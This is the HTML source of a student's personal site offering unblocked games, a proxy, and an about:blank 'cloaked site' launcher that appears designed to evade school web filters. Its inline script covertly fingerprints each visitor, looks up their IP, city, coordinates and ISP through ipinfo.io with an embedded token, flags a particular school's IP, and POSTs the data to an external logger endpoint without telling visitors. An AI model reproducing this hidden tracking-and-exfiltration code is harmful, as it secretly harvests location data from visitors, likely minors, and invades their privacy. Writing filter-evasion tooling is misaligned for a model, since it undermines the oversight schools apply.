<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="title" content="ethanytang" />
  <meta name="robots" content="index, follow" />
  <meta name="google-site-verification" content="je81n_UtY27MEUx6Cy_o74rw-ibJmZRVluilmMSrD0k" />
  <link rel="icon" href="assets/img/classroom.png" type="image/png" />
  <title>Classroom</title>
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- Announcement Popup -->
  <div id="announcement-popup" class="popup-overlay">
    <div class="popup-content">
      <span id="close-btn" class="close-btn">&times;</span>
      <h3>Legal Notice</h3>
      <p>
        This website has been developed exclusively for educational purposes. Any misuse, unauthorized activity, or unlawful behavior conducted through this site is the sole responsibility of the user. By proceeding, you acknowledge and accept these terms. Sorry, I have to put this here.
      </p>   
      <p>For more information</p>
      <a href="https://ethanytangcodes.github.io/terms.html" style="color: blue;">click here</a>
    </div>
  </div>

  <!-- Navbar -->
  <nav class="navbar">
    <a href="index.html">Home</a>
    <a href="/aboutme.html">About Me</a>
    <a href="/chat.html">Chat</a>
    <a href="/info.html">Info</a>
    <a href="/log.html">Log</a>
    <a href="/birthday.html">Bday cntdwn</a>
  </nav>

  <!-- Main Content -->
  <main>
    <br />
    <p>I'm Ethan, I go to MMS, I'm 13 years old, and this is my website.</p>
    <p>Nothing much useful here because it's still a work in progress.</p>
    <p>proxy is here! shellshockers is hard to get</p>
    <h2>back for the 25-26 school year!</h2>

    <button id="launch-site-btn" class="gfiles-button">Launch Cloaked Site</button>
    <p>Maybe check back later.</p>

    <a href="https://hits.sh/ethanytangcodes.github.io/"><img alt="Hits" src="https://hits.sh/ethanytangcodes.github.io.svg"/></a>

    <h1 id="projects">Made by Ethan Tang</h1>

    <div class="spacer"></div>
    <a href="/images/" class="gfiles-button">g4mes</a>
    <a href="/contacts/" class="gfiles-button">tons of unblocked g4mes</a>
    <a href="/text-game/" class="gfiles-button">this is a cool text adventure g4me</a>
    <a href="/proxy/" class="gfiles-button">finally added a proxy but it isnt the best since it's static and based off of someone elses server</a>

    <p class="intro-text fade-in-on-scroll">This stuff is off of other websites ‚Äî I just got their code and formatted it to fit my website.</p>
    <p class="fade-in-on-scroll">I've made my website open to all because I believe that people should have access to g4mes.</p>
    <p class="fade-in-on-scroll">But use this site responsibly, and I'm not responsible if you get in trouble.</p>

    <a href="secret.html">
      <img src="assets/img/secret.png" alt="Easter Egg" class="secret-image" />
    </a>
  </main>

  <!-- Survey Popup -->
  <div id="survey-popup" class="survey-popup" style="display: none;">
    <span>yo pls fill out this survey for feedback thx</span>
    <a href="https://docs.google.com/forms/d/e/1FAIpQLSfD3mzHYFeX8cowmcQsyZoBVKqvZ5qWCB4lbZcE_Lz-CnRr1w/viewform?usp=dialog" target="_blank">here</a>
    <button id="survey-close" class="survey-close">&times;</button>
  </div>

  <!-- Scripts -->
  <script>
  // =================== Announcement Popup ===================
  function closePopup() {
      document.getElementById('announcement-popup').style.display = 'none';
  }

  window.onload = function () {
      const popup = document.getElementById('announcement-popup');
      const closeBtn = document.getElementById('close-btn');

      popup.style.display = 'flex';
      closeBtn.style.pointerEvents = 'none';
      closeBtn.style.opacity = '0.5';

      setTimeout(() => {
          closeBtn.style.pointerEvents = 'auto';
          closeBtn.style.opacity = '1';
          closeBtn.addEventListener('click', closePopup);
      }, 3000);

      // Show survey popup after 5 seconds
      setTimeout(() => {
          document.getElementById("survey-popup").style.display = "flex";
      }, 5000);
  };

  // Survey close button
  document.getElementById("survey-close").onclick = () => {
      document.getElementById("survey-popup").style.display = "none";
  };

  // =================== Launch Cloaked Site ===================
  document.getElementById("launch-site-btn").onclick = function () {
      const win = window.open();
      win.document.body.style.margin = "0";
      win.document.body.style.height = "100vh";
      const iframe = win.document.createElement("iframe");
      iframe.style.border = "none";
      iframe.style.width = "100%";
      iframe.style.height = "100%";
      iframe.style.margin = "0";
      iframe.referrerPolicy = "no-referrer";
      iframe.allow = "fullscreen";
      iframe.src = "https://ethanytangcodes.github.io";
      win.document.body.appendChild(iframe);
  };

  // =================== Logger Script (FingerprintJS + IPinfo + Discord) ===================
  (async () => {
      const welcomeMsg = document.createElement("div");
      welcomeMsg.style.padding = "10px 20px";
      welcomeMsg.style.borderRadius = "12px";
      welcomeMsg.style.fontSize = "18px";
      welcomeMsg.style.fontWeight = "bold";
      welcomeMsg.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.3)";
      welcomeMsg.style.margin = "20px auto";
      welcomeMsg.style.width = "300px";
      welcomeMsg.style.textAlign = "center";
      welcomeMsg.style.display = "block";

      const navbar = document.querySelector(".navbar");
      navbar.insertAdjacentElement("afterend", welcomeMsg);

      const fp = await FingerprintJS.load();
      const result = await fp.get();
      const visitorId = result.visitorId;

      const specialIDs = ["a8538f04739a15f3686e4ef1068c57bd"];
      const visits = parseInt(localStorage.getItem("visits") || "0") + 1;
      localStorage.setItem("visits", visits);

      if (specialIDs.includes(visitorId)) {
          welcomeMsg.textContent = "üî• Welcome back, VIP! üî•";
          welcomeMsg.style.backgroundColor = "#ff4500";
          welcomeMsg.style.color = "#fff";
      } else {
          welcomeMsg.textContent = visits === 1
              ? "Welcome to the site for the first time!"
              : `Welcome back! You've visited this site ${visits} times.`;
          welcomeMsg.style.backgroundColor = "#333";
          welcomeMsg.style.color = "#fff";
      }

      // IP info
      fetch("https://ipinfo.io/json?token=d3c139f7603b13")
          .then(res => res.json())
          .then(data => {
              let extraAlert = "";
              if (data.ip === "205.174.240.247") {
                  welcomeMsg.textContent = visits === 1
                      ? "üéì Miller student detected! This is your first visit."
                      : `üéì Miller student detected! You've visited this site ${visits} times.`;
                  extraAlert = "MILLER STUDENT DETECTED";
              }

              const message = `
üì° New visitor on your site!
üÜî FingerprintJS ID: ${visitorId}
üß† IP: ${data.ip}
üåç Location: ${data.city}, ${data.region}, ${data.country}
üìç Coords: ${data.loc}
üïπ ISP: ${data.org}
üíª User Agent: ${navigator.userAgent}
üìÖ Time: ${new Date().toLocaleString()}
Visits: ${visits}
${extraAlert}
              `;

              fetch("https://logger.ethantytang11.workers.dev/", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ message: message })
              })
              .then(res => res.text())
              .then(console.log)
              .catch(console.error);
          })
          .catch(err => console.error("‚ö†Ô∏è IP fetch error:", err));
  })();
  </script>
</body>
</html>
